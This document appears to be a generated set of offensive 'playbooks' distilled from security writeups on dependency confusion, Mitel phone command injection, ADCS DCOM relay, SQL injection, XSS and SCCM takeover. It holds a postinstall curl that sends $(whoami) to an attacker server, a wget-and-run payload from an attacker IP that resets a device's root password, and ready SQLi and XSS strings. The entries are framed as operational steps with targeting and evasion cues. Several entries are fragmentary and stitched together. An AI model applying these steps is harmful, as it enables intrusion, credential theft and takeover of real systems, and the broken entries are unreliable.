playbooks.impact: Remote Code Execution (RCE) on the target server, allowing an attacker to execute arbitrary code with the privileges of the web application.
playbooks.key_lesson: When dealing with ASP.NET applications, be vigilant for .NET Remoting endpoints and craft malformed requests to trigger exceptions that might leak internal `ObjRef`s, enabling RCE.

meta.title: How I hacked into Google’s internal corporate assets
meta.bounty: honourable mention (no bounty for developer machine compromise)

target_profile.technology: Open Source Software Libraries / Package Management (npm, pip)
tech_stack_fingerprints: Uses npm or pip for package management
Internal artifact registry for private packages

trigger_conditions.when_to_apply: When an organization uses open-source libraries and fetches them from both internal and public registries, and an attacker can register a package name in a public registry that the organization uses internally.
prerequisites: Target organization uses package managers like npm or pip.
Target organization fetches packages from both internal and public registries.
Attacker can identify an internal package name that is not published in the public registry.
Attacker can register a malicious package with the same name in the public registry.
applicability_signals: Observation of `npm install <packagename>` or `pip install <packagename>` commands within the target's development or CI/CD processes.
Evidence of private package repositories being used internally.
skip_if: All dependencies are strictly managed and only fetched from trusted internal sources without fallback to public registries.
WAF blocks requests to public package repositories.

recon_steps: Step 1: Identify internal package names used by the target organization through code review, dependency analysis, or observation of build logs.
Step 2: Check if these internal package names are also published in public registries (e.g., npmjs.com, PyPI).
Step 3: Identify internal package names that are not present in public registries.
attack_steps: Step 1: Register a malicious package with the same name as an identified internal package on a public registry.
Step 2: Craft a malicious payload within the registered package that executes arbitrary commands upon installation (e.g., a post-install script).
Step 3: Wait for the target's build system or developer machines to attempt to fetch the dependency, which will then pull the malicious package from the public registry.
Step 4: Observe the execution of the malicious payload on the target's infrastructure.
payloads_or_patterns: Example for npm: Create a `package.json` with a `scripts` section like: `"postinstall": "curl http://<attacker_collaborator_server>/$(whoami)"`
Example for pip: Create a `setup.py` with a `cmdclass` that executes a malicious command on setup.
tools_recommended: Burp Suite Collaborator or interactsh for receiving callbacks from executed commands.
Custom scripts to automate package publishing and monitoring.
Dependency analysis tools (e.g., OWASP Dependency-Check, Snyk) to identify potential targets.
success_indicators: Callback received on the attacker's collaborator server indicating command execution (e.g., IP address, hostname, user ID).
Unexpected outbound network connections from the target's infrastructure.
Execution of commands with elevated privileges (e.g., `root` or `admin`).
failure_indicators: No callbacks received after a reasonable waiting period, indicating the malicious package was not fetched or executed.
Build errors or warnings related to package fetching or execution.

Target infrastructure showing no signs of compromise or unexpected activity. If no callbacks are received, re-evaluate package names, verify public registry availability, and ensure correct payload for the package manager is used.

playbooks.impact: Execution of arbitrary commands on internal corporate assets, servers, containers, CI/CD systems, and developer machines as root or administrator. This can lead to data exfiltration, further system compromise, or disruption of services.
playbooks.key_lesson: Always ensure that internal package names are either not publishable publicly or are intentionally published to public registries with benign or secure payloads to prevent dependency confusion attacks.

meta.title: Exploiting embedded mitel phones for unauthenticated remote code execution

trigger_conditions.when_to_apply: When the target is a Mitel IP phone and the attacker can access the administrative settings to reach the diagnostics and capture features.
prerequisites: Network access to the Mitel IP phone's administrative interface.
applicability_signals: Existence of 'Diagnostics -> Diagnostic Server' and 'Diagnostics -> Capture' menus in the admin interface.
skip_if: Network filtering prevents access to the phone's admin interface.
The specific diagnostic and capture features are disabled or not present.

recon_steps: Access the Mitel IP phone's web administrative interface.
Navigate to 'Admin settings -> Diagnostics -> Diagnostic Server'.
attack_steps: Step 1: In the 'Diagnostic Server' input field, enter a command injection payload that starts a telnet daemon, e.g., '&telnetd;'
Step 2: Navigate to 'Admin settings -> Diagnostics -> Capture'.
Step 3: Click 'Start', then 'Stop', and then 'Upload'. During the upload process, the command injection payload will execute.
Step 4: After the upload completes, attempt to connect to the phone via telnet using the default IP address (e.g., 192.168.1.100).
Step 5: If telnet is available, attempt to log in as root. If authentication is required, prepare a payload to reset the root password.
Step 6: Construct a payload to download and execute a script to reset the root password, e.g., '&telnetd;cd /tmp;wget <attackerip>/s.sh;chmod +x ./s.sh;./s.sh;rm s.sh;'

Step 7: Host the password reset script 's.sh' on an attacker-controlled HTTP server. The script should contain commands to set the root password, e.g., 'sudo su; printf "sample
sample
sample
" | passwd root'.
Step 8: Upload the malicious script and execute it via the command injection. Then, attempt to log in with the new root password ('sample').
tools_recommended: Netcat or similar for listening for telnet connections.
Python HTTP server (python -m http.server 80) for hosting the payload script.
success_indicators: Successful telnet connection to the Mitel IP phone.
Login as root user after executing the password reset script.
Execution of commands as root on the phone (e.g., 'whoami', 'uname -a').
failure_indicators: Telnet connection refused or fails: indicates telnetd was not successfully started or network issues. Pivot to other command injection vectors if available.
Command injection payload does not execute: check syntax and available characters on the phone's keyboard for crafting payloads.
File download fails: ensure the attacker's HTTP server is accessible from the phone's network.

playbooks.impact: Unauthenticated Remote Code Execution as root on the Mitel IP phone, allowing complete control over the device, potential access to sensitive call data, and further network pivoting.
playbooks.key_lesson: When researching embedded devices, look for command injection vulnerabilities in administrative interfaces, especially within diagnostic or logging features, as they can provide an initial foothold for deeper analysis and exploitation.

meta.title: Hello: I’m your ADCS server and I want to authenticate against you

tech_stack_fingerprints: Windows Server with ADCS role installed

trigger_conditions.when_to_apply: This technique is applicable when an attacker has authenticated access to a domain and identifies a Windows server with the ADCS role installed, where the 'Certificate Service DCOM Access' group has 'Remote Launch' and 'Remote Activation' permissions on the CertSrv Request DCOM server, and the DCOM server impersonates a high-privileged account like SYSTEM.
prerequisites: Attacker has authenticated access to the target domain.
Target server has the ADCS role installed.
The 'Certificate Service DCOM Access' group has 'Remote Launch' and 'Remote Activation' permissions on the 'CertSrv Request' DCOM application.
The 'CertSrv Request' DCOM application is configured to allow remote activation by 'Everyone' or equivalent.
The 'CertSrv Request' DCOM application impersonates a high-privileged account (e.g., SYSTEM).
applicability_signals: Observation of the 'Certificate Service DCOM Access' group membership and permissions via DCOMCNFG or equivalent tools.
Confirmation that the 'CertSrv Request' DCOM server is listening for remote connections.
Identification of the DCOM application's identity settings (impersonation of SYSTEM or similar).
skip_if: ADCS role is not installed on the target server.
DCOM permissions for 'CertSrv Request' do not allow remote launch/activation for authenticated users.
The DCOM server does not impersonate a privileged account.

recon_steps: Step 1: Enumerate domain-joined Windows servers and identify those with the Active Directory Certificate Services (ADCS) role installed.

Step 2: On identified ADCS servers, query DCOM configurations (e.g., using dcomcnfg or remote registry access) to inspect the permissions of the 'CertSrv Request' application, specifically checking the 'Certificate Service DCOM Access' group for 'Remote Launch' and 'Remote Activation' rights. Also, verify the identity the DCOM server runs under.
attack_steps: Step 1: Set up a listener on an attacker-controlled machine (e.g., using socat or netcat) to capture incoming NTLM/Kerberos authentication attempts on a specific port (e.g., 445 for SMB, or a custom port for other protocols).

Step 2: Configure a tool like RemotePotato0 (or a similar modified JuicyPotato) to target the ADCS server. Modify the tool's configuration to specify the IP address of the ADCS server as the remote DCOM server host.

Step 3: Configure the tool to use the attacker's machine as the target for authentication relay. This typically involves setting up a redirector (e.g., socat) on the ADCS server's network or directly on the attacker's machine if it can receive traffic from the ADCS server, to forward traffic from the DCOM activation port (e.g., 135) to the attacker's listener.
Step 4: Execute the modified Potato exploit tool, forcing the privileged DCOM application on the ADCS server to activate and authenticate against the attacker's listener.
Step 5: Capture the authentication credentials (NTLM hash or Kerberos ticket) from the listener.

Step 6: Relay the captured credentials to a high-privileged service on the ADCS server or another domain resource to achieve privilege escalation (e.g., to SYSTEM on the ADCS server, or Domain Admin if targeting specific relay scenarios).
payloads_or_patterns: Modified JuicyPotato/RemotePotato0 configuration file specifying remote COSERVERINFO and COAUTHIDENTITY.
tools_recommended: RemotePotato0 or a modified JuicyPotato exploit (with updated COSERVERINFO for remote targets).
socat for port redirection and listener setup.
Responder or ntlmrelayx for capturing and relaying NTLM/Kerberos authentication.
Impacket suite for interacting with Windows protocols.
success_indicators: Capture of NTLM authentication hash or Kerberos ticket on the attacker's listener.
Successful relay of captured credentials to gain elevated privileges (e.g., SYSTEM shell on the ADCS server, or Domain Admin rights).
failure_indicators: No authentication captured on the listener → Check DCOM activation permissions and network connectivity between attacker and target. Try different relay targets.

Authentication captured but relay fails (e.g., Access Denied) → The relayed credentials might be for a service that doesn't grant the desired privileges. Investigate other services on the ADCS server or domain for relaying.
DCOM activation errors (e.g., 0x80070005 Access Denied) → Incorrect DCOM permissions or attacker not part of 'Authenticated Users'.

playbooks.impact: An attacker can impersonate a high-privileged account (e.g., SYSTEM) on the ADCS server, leading to local privilege escalation. In certain configurations and with further relaying, this can escalate to Domain Administrator privileges by compromising the ADCS server or other domain resources.
playbooks.key_lesson: Always investigate DCOM services running under privileged accounts for remote activation permissions that can be abused for authentication coercion and privilege escalation.

meta.title: From CRLF Injection to XSS: Elevating the Stakes in Apple iTunes Security

affected_components: /api/v1/export (inferred from context, specific endpoint not named)
tech_stack_fingerprints: apple.com main domain source code referencing subdomains

trigger_conditions.when_to_apply: When an API subdomain is referenced in the main website's source code and accepts parameters, and can be manipulated to affect the Content-Type header in its responses.
prerequisites: Attacker must be able to observe traffic to/from the target subdomain (e.g., via Burp Suite).
applicability_signals: Subdomain accepts parameters that can be fuzzed.
Responses are initially JSON, but Content-Type can be manipulated.
skip_if: WAF blocks CRLF injection attempts.
Content-Type header cannot be manipulated or does not affect response parsing.

recon_steps: Step 1: Analyze source code of apple.com to identify subdomains used for APIs and note parameters accepted.
Step 2: Proxy traffic to identified subdomains using Burp Suite to observe requests and responses.
attack_steps: Step 1: Send a request to the identified API subdomain with a parameter that accepts input.
Step 2: In Burp Suite Repeater, fuzz the parameter with '%0d%0aSet-Cookie: attacker=exploit'. Observe if the cookie is reflected.

Step 3: If reflection is observed but within a JSON response, attempt to manipulate the 'Content-Type' header in the request (e.g., change from 'application/json' to 'text/plain' or similar) to force reflection outside JSON.

Step 4: Once reflection is confirmed outside JSON, craft a payload to achieve XSS by injecting JavaScript code within the reflected parameter, potentially targeting cookie theft or other malicious actions.
tools_recommended: Burp Suite (Repeater, Proxy)
Dalfox
Nuclei
success_indicators: Reflection of injected cookie ('attacker=exploit') in the response.
Successful manipulation of Content-Type header leading to reflection outside JSON.
Execution of JavaScript payload (e.g., alert box) in the browser context.
failure_indicators: 400 Bad Request on CRLF injection attempts → WAF blocking or malformed input.
No reflection of cookie or payload → parameter is not vulnerable or not reflected as expected.
Content-Type manipulation does not change response parsing → server is not respecting the header for this endpoint.

playbooks.impact: Execution of arbitrary JavaScript in the context of the user's browser, potentially leading to session hijacking, credential theft, or further attacks.
playbooks.key_lesson: When initial vulnerability findings are mitigated by response content types (like JSON), investigate manipulating the Content-Type header to achieve broader exploitability, and always confirm reflection points for XSS payloads.

meta.title: Go Go XSS Gadgets: Chaining a DOM Clobbering Exploit in the Wild
meta.authors: Brett Buerhaus, Sam Curry, Maik Robert

trigger_conditions.when_to_apply: When a web application uses `postMessage` for inter-window communication and the listener processes `e.data.params.titleText` via `innerHTML` without sufficient sanitization, allowing for XSS.
prerequisites: Target uses `postMessage` for cross-origin communication.
The `auth.bridge.host.fix.js` script is loaded and processed.
An endpoint like `/auth/login/present` initiates the message listener.
applicability_signals: Existence of `window.addEventListener('message', ...)` in JavaScript.
Processing of `e.data.params.titleText` in a sink like `innerHTML` within the message handler.
`postMessage` origin checks allowing for subdomains (`*.domain2.com`).
skip_if: All `postMessage` events are validated against a strict origin that cannot be spoofed.
The `titleText` parameter is thoroughly sanitized before being used in `innerHTML`.

recon_steps: Step 1: Identify the `postMessage` event listener in the target's JavaScript code (e.g., `auth.bridge.host.fix.js`). Look for `window.addEventListener('message', ...)`. Observe the origin validation regex. Note any trusted origins that are not the primary domain.

Step 2: Analyze the `postMessage` handler function (`obj.events.window.message`) and trace the data flow. Identify the specific function called (e.g., `loginWidget`) and the parameters processed (`e.data.params`).
Step 3: Locate sinks where parameters are used, such as `innerHTML`, `outerHTML`, `document.write`, etc. Confirm if `e.data.params.titleText` is directly assigned to such a sink.
attack_steps: Step 1: Craft a `postMessage` payload targeting a subdomain that is allowed by the origin checks but is less secured (e.g., `*.domain2.com`). The payload should contain the `titleText` parameter with an XSS payload.

Step 2: Send the `postMessage` to an appropriate window or iframe context on the target's domain (e.g., triggered by loading `connect.secure.domain1.com/auth/login/present?widget=true&origin=ma` in an iframe from a controlled `domain2.com` site).
Step 3: If successful, the XSS payload in `titleText` will be rendered as HTML, leading to code execution in the context of `connect.secure.domain1.com`.
tools_recommended: Burp Suite: To intercept and modify `postMessage` payloads.
Browser Developer Tools: To analyze JavaScript, identify event listeners, and debug `postMessage` interactions.
A controlled `domain2.com` subdomain: To host the iframe that sends the `postMessage`.
success_indicators: Execution of the `alert()` function, showing `document.domain` (e.g., `connect.secure.domain1.com`).
The injected HTML or script is visible in the DOM.
failure_indicators: The `postMessage` is ignored or rejected due to origin checks.
The `titleText` parameter is sanitized and does not execute script.
The `postMessage` is received but does not trigger the `loginWidget` function or the `innerHTML` sink is not reached.

playbooks.impact: Cross-Site Scripting (XSS) on the `connect.secure.domain1.com` domain, which is the company's primary authentication portal where authenticated users interact with their accounts. This can lead to session hijacking, credential theft, or further exploitation.
playbooks.key_lesson: Always review `postMessage` implementations for proper origin validation and sanitize all data received from untrusted sources, especially when using sinks like `innerHTML`.

meta.title: Defeating Length Filters to Dump the Database - SQLi

tech_stack_fingerprints: CTXSYS.DRITHSX.SN function call in SQL payloads

trigger_conditions.when_to_apply: When a target application exhibits varying response lengths or status codes upon injecting different characters/strings into parameters, and standard SQLMap enumeration fails due to character filtering.
prerequisites: The target application must have an identifiable parameter that accepts user input and is vulnerable to SQL injection.
The application must have some form of input filtering or length restrictions that prevent direct exploitation with common tools like SQLMap.
applicability_signals: Injecting a single quote (') results in a different response length or status code compared to the normal response.
SQLMap identifies a boolean-based blind SQL injection but fails to enumerate data due to filtered characters.
skip_if: All injected payloads result in the same response length or status code.
The application strictly validates input and returns consistent error messages or no errors for any SQL injection attempts.
A 403 Forbidden response is received for all SQL injection attempts, indicating a Web Application Firewall (WAF).

recon_steps: Step 1: Browse the web application and identify parameters that accept user input.
Step 2: Manually inject special characters (e.g., ', ", (, )) into each parameter and observe changes in response length, status codes, and error messages.
Step 3: Send identified suspicious requests to SQLMap to confirm SQL injection and gather initial payloads.
Step 4: Attempt to enumerate databases using SQLMap. If it fails, analyze the filtered characters by testing various strings and observing the response.
attack_steps: Step 1: Construct manual SQL injection payloads by simplifying SQLMap's boolean-based blind injection. Start with payloads like: `' AND ( SELECT ( CASE WHEN (1=1) THEN NULL ELSE 1/0 END ) FROM DUAL ) IS NULL OR ' ' = ' '`

Step 2: Experiment with different string lengths within the CASE WHEN condition to discover the length filter. For example, compare the response for a short number (1=1) versus a very long number (12345678901234567890=12345678901234567890).

Step 3: If a length filter is detected (e.g., a 302 redirect for longer strings), devise payloads that bypass this filter. This might involve using functions that return shorter strings or manipulating the query to avoid triggering the filter.

Step 4: Once the length filter is bypassed, use the valid, albeit filtered, payloads to enumerate database names, table names, and finally, data from the tables by carefully crafting payloads that fit within the allowed length and character set.
payloads_or_patterns: ' AND (SELECT (CASE WHEN (4747=4747) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,4747) END) FROM DUAL) IS NULL OR '
' AND ( SELECT ( CASE WHEN (1=1) THEN NULL ELSE 1/0 END ) FROM DUAL ) IS NULL OR ' ' = ' '
' AND ( SELECT ( CASE WHEN (12345678901234567890=12345678901234567890) THEN NULL ELSE 1/0 END ) FROM DUAL ) IS NULL OR ' ' = ' '
tools_recommended: Burp Suite: For intercepting and modifying requests, observing response differences, and testing manual payloads.
SQLMap: For initial detection and generating baseline payloads. May require custom scripting or advanced usage to bypass filters.
A custom script (e.g., Python) to automate the process of testing different payload lengths and structures to discover and bypass the filter.
success_indicators: Successful enumeration of database names using a crafted payload that bypasses the length filter.
Successful retrieval of table names from the target database.
Successful extraction of specific data rows from a target table, confirming full database dump capability.
failure_indicators: Consistent 302 redirects or other error responses for all attempted payloads, even with bypassed length restrictions, indicating a robust WAF or deeper filtering mechanisms. Suggestion: Try alternative SQL injection techniques or look for other vulnerabilities.
Inability to discover or bypass the length filter after extensive testing. Suggestion: Re-evaluate the filtering mechanism or move to a different vulnerability class.

playbooks.impact: Full database compromise, including unauthorized access to sensitive information, potential for data modification or deletion, and further exploitation of the application based on the obtained data.
playbooks.key_lesson: When encountering input filters that prevent standard SQL injection tools, meticulously analyze response variations (length, status codes) to discover and bypass specific filtering rules like length restrictions.

meta.title: SCCM Hierarchy Takeover with High Availability

affected_components: SCCM Hierarchy and High Availability features
tech_stack_fingerprints: Implied by the target being SCCM

trigger_conditions.when_to_apply: When an attacker has authenticated access to a machine within the SCCM hierarchy and can enumerate SCCM client information and site server details.
prerequisites: Attacker has authenticated access to a machine that is a client of SCCM.
Attacker can enumerate SCCM client properties and site server information.
applicability_signals: Presence of SCCM client components and services on endpoints.
Ability to query SCCM client site information (e.g., `SMS Client Cache` registry key, WMI queries).
skip_if: SCCM client is not installed or configured on endpoints.
Network segmentation prevents communication with SCCM site servers.

recon_steps: Step 1: Identify SCCM clients and their associated site servers on the network.
Step 2: Enumerate SCCM client cache properties and site server FQDNs from client machines (e.g., via registry or WMI).
Step 3: Analyze discovered site servers for High Availability configurations (e.g., SQL Always On Availability Groups).
attack_steps: Step 1: On a compromised SCCM client, identify the site code and site server FQDN.
Step 2: Enumerate site server details and potential High Availability configurations (e.g., SQL replicas).
Step 3: If a SQL Always On Availability Group is identified, attempt to gain administrative access to the SQL Server hosting the SCCM database.

Step 4: Once administrative access to the SCCM database is achieved, manipulate SCCM objects to gain control over the SCCM hierarchy (e.g., create malicious distribution points, deploy unauthorized software).
payloads_or_patterns: Registry key enumeration for SCCM client info (e.g., `HKLM\SOFTWARE\Microsoft\SMS\Client\Configuration\Client Properties\` for `SiteServer` and `AssignedSiteCode`).
WMI queries for SCCM client information.
SQL queries to identify Always On Availability Groups and database configurations for SCCM.
PowerShell scripts for SCCM object manipulation (e.g., `Add-CMDistributionPoint`, `New-CMAppDeployment`).
tools_recommended: PowerShell (for WMI queries, registry access, SCCM cmdlets)
SQL Server Management Studio (SSMS) (for SQL database interaction)
BloodHound (for enumerating relationships and identifying potential pivot points within the SCCM infrastructure)
success_indicators: Successful enumeration of SCCM client properties and site server details.
Successful connection to the SCCM SQL database with administrative privileges.
Successful creation/modification of SCCM objects leading to unauthorized code execution or system control.
failure_indicators: Inability to enumerate SCCM client information (suggests SCCM is not widely deployed or accessible).
401/403 errors when attempting to connect to the SCCM SQL database (suggests incorrect credentials or insufficient privileges).
WAF blocking SQL injection attempts or WMI queries.

playbooks.impact: Complete takeover of the SCCM hierarchy, allowing the attacker to deploy malicious software, execute arbitrary code on all managed endpoints, and potentially gain administrative control over the entire Windows domain managed by SCCM.
playbooks.key_lesson: When targeting environments with SCCM, investigate its hierarchy and High Availability configurations, as compromising the SCCM SQL database can lead to complete infrastructure takeover.

meta.title: Hijacking Safetensors Conversion On Hugging Face

Step 2: Understand the workflow of model submission for Safetensors conversion and identify how user-submitted models are processed.

Step 2: Submit the malicious model to the Hugging Face Safetensors conversion service.

payloads_or_patterns: A Safetensors file containing embedded malicious code or data designed to be executed or trigger specific actions when processed by the Hugging Face conversion bot. tools_recommended: Hugging Face CLI or web interface for model submission
Custom scripts to craft malicious Safetensors files (specific tools not detailed in writeup)
success_indicators: A pull request is automatically created on a target repository on Hugging Face, originating from the Hugging Face conversion bot, containing attacker-controlled data or code.

meta.title: Coercing XML Deserialization Errors to Achieve XSS in Citrix StoreFront (CVE-2023-5914)

trigger_conditions.when_to_apply: When the target application exhibits an XML parsing procedure during an SSO flow that can be coerced into an error state, leading to reflected XSS.
prerequisites: Target application must be Citrix StoreFront.
applicability_signals: Presence of the /Citrix/teststoreAuth/SamlTest endpoint.
The endpoint accepts GET or POST requests.
The endpoint performs XML parsing on the 'SAMLResponse' form parameter.
The endpoint can be made to throw an error during XML parsing.
skip_if: The /Citrix/teststoreAuth/SamlTest endpoint is not accessible.
The endpoint does not process the 'SAMLResponse' parameter.
No exploitable error can be triggered via malformed XML in the 'SAMLResponse'.

recon_steps: Step 1: Decompile the Citrix StoreFront application using dnSpy.
Step 2: Search for classes inheriting from BaseMvcController.
Step 3: Identify accessible endpoints on these controllers without authentication, focusing on those related to SSO or SAML.
attack_steps: Step 1: Navigate to the identified endpoint: GET /Citrix/teststoreAuth/SamlTest.
Step 2: Observe the application's behavior and response.
Step 3: Craft a POST request to /Citrix/teststoreAuth/SamlTest with a malformed XML payload in the 'SAMLResponse' form parameter. The malformed XML should aim to trigger an XML parsing error.

Step 4: Inject XSS payloads into the malformed XML. The writeup indicates that the error message itself may reflect user input, suggesting potential for XSS within error messages or in subsequent rendering of parsed data.
Step 5: Analyze the response for reflected XSS.
tools_recommended: dnSpy: For decompiling and code analysis.
Burp Suite: To craft and send custom HTTP requests, and to analyze responses.
success_indicators: The response contains an XSS payload that is executed in the browser.
The response reflects parts of the injected malformed XML or error messages in an unsafe manner, indicating potential for XSS.
failure_indicators: A generic error message is returned without reflecting any user input or injected payload.
A 4xx or 5xx error code is returned without any actionable insight for XSS.
The application sanitizes or properly handles the malformed XML without rendering it unsafely.

playbooks.impact: Allows an unauthenticated attacker to execute arbitrary JavaScript in the victim's browser within the context of the vulnerable StoreFront application, potentially leading to session hijacking, credential theft, or further attacks.
playbooks.key_lesson: When analyzing SSO flows involving XML parsing, always test for XML External Entity (XXE) and malformed XML vulnerabilities that can lead to parsing errors, as these errors might reflect user-controlled input in a vulnerable manner, resulting in XSS.

meta.title: Nom for Security: A Proactive Security Review of Nomulus

Unsuccessful operations returning verbose debug information instead of generic error messages.

The application's logging is strictly controlled and not exposed to the client.

Step 2: Monitor all responses for any unhandled exceptions, verbose error messages, or diagnostic information that might be returned to the client.
attack_steps: Step 1: Attempt to log in with invalid credentials to trigger authentication failure messages. Analyze the response for any leaked information.
Step 2: Trigger other common user flows (e.g., searching for domains, account creation if applicable) and observe responses for verbose error handling.
Step 3: If specific parameters or inputs are known to cause exceptions, fuzz them to see if the application leaks internal details.
payloads_or_patterns: Malformed or unexpected input for various parameters.
tools_recommended: Burp Suite: Intercept and analyze all HTTP requests and responses, paying close attention to error messages and status codes.

meta.title: Joomla: PHP Bug Introduces Multiple XSS Vulnerabilities (CVE-2024-21726)

affected_components: Components that use PHP's `preg_match` with certain patterns (e.g., custom components, plugins, or core features that are not properly sanitized)
tech_stack_fingerprints: Server headers may indicate PHP version.

trigger_conditions.when_to_apply: This vulnerability is applicable to Joomla! installations where user input is processed by `preg_match` with a vulnerable pattern without proper sanitization, and the output is rendered directly in the HTML without encoding.
prerequisites: Attacker must have an authenticated user account.
Target component must be vulnerable to XSS via `preg_match`.
applicability_signals: Discovery of any component or plugin that accepts user input and processes it with `preg_match`.
Analysis of custom code or third-party extensions for insecure use of `preg_match`.
skip_if: All user input is properly sanitized or encoded before rendering.
The `preg_match` function is not used in a way that leads to HTML injection.
The target version of Joomla! is patched against CVE-2024-21726.

recon_steps: Step 1: Identify components or plugins within Joomla! that accept user-generated input (e.g., form fields, URL parameters, POST data).
Step 2: Review the source code of these components for the usage of PHP's `preg_match` function. Pay close attention to the patterns used and how the matched content is handled.
attack_steps: Step 1: Craft a payload that exploits the identified `preg_match` vulnerability. This typically involves injecting HTML or JavaScript code that the `preg_match` function incorrectly processes.
Step 2: Submit the crafted payload through the vulnerable input vector (e.g., a form field, a URL parameter).
Step 3: Observe the response to see if the injected payload is rendered in the HTML output without proper encoding, indicating XSS execution.
payloads_or_patterns: Example payload pattern (actual payload depends on the specific `preg_match` pattern): `<script>alert(document.domain)</script>` or similar HTML/JS injection strings.

The writeup does not provide specific exploit payloads, but the core issue is the mishandling of regex matches, suggesting that input which triggers unexpected matches and is then echoed unsanitized would be the vector.
tools_recommended: Burp Suite or OWASP ZAP for intercepting and modifying requests.
Browser developer tools for inspecting HTML output.
Code review tools or static analysis tools like SonarQube to identify vulnerable `preg_match` usage.
success_indicators: Execution of JavaScript code in the browser (e.g., an alert box appears).
The injected HTML/JavaScript snippet is visible in the rendered page source without being escaped.
failure_indicators: The payload is displayed as plain text or is encoded (e.g., `<script>` becomes `<script>`).
A WAF blocks the request.
No JavaScript execution or visual rendering of injected code.

playbooks.impact: An attacker can execute arbitrary JavaScript code in the context of the victim's browser session. This can lead to session hijacking, phishing, defacement, or redirecting users to malicious websites.
playbooks.key_lesson: Always sanitize and encode user-supplied data before rendering it in HTML to prevent XSS, especially when using regular expressions to process input.

meta.title: XSS Marks the Spot: Digging Up Vulnerabilities in ChatGPT

Step 2: In the 'name' field, enter a simple XSS payload such as `<script>alert(1)</script>`.
Step 3: Save the changes to the profile.
Step 4: Observe if the injected script is executed, e.g., by checking if an alert box pops up.

Step 5: If the simple payload fails, try more sophisticated payloads, including those designed to bypass Content Security Policy (CSP) if one is in effect, or payloads that leverage JavaScript execution in other parts of the application's front-end.
tools_recommended: Burp Suite: To intercept and modify HTTP requests when updating the profile name.
Browser Developer Tools: To inspect HTML source and JavaScript execution.
